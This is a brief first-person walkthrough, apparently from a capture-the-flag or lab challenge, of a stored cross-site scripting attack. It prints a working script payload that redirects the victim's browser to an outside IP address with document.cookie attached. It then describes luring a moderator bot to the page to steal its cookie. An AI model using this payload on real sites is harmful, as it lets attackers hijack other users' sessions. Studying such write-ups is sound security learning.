Tried writing HTML code in the page - The page displayed as formatted => cross site scripting possible.

wrote the code to get the user cookie:

<script>
location.href=("http://24.3.18.163:9999?c="+document.cookie)
</script>

By doing report to moderator, and seeing message, I can see that some kind of script will visit the reported page with moderators cookie.
Ran a server on my system, and enabled port forwarding on the router.

Once the request came, I got the cookie.
